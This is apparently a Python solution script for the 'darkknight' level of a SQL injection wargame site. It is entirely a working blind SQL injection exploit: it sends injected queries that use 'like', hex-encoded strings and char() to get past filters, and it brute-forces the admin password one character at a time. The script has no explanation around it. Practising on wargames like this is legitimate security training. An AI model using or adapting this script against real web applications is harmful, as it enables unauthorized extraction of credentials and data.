import urllib.request
import sys

url = "https://los.rubiya.kr/chall/darkknight_5cfbc71e68e09f1b039a8204d1a81456.php?"
cookie = sys.argv[1]
pw = ''
letter = list(range(48, 64)) + list(range(97, 122))

for i in range(1, 9):
  for j in letter:
    query = "no=0%20or%20id%20like%200x61646d696e%20and%20mid(pw,{},1)%20like%20char({})".format(i,j)
    req = urllib.request.Request(
      url+query,
      data=None,
      headers={
        "User-Agent" : "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
        "Cookie" : cookie
      })
    with urllib.request.urlopen(req) as res:
      body = res.read().decode()
    if 'Hello admin' in body:
      pw += chr(j)
      break
print(pw)
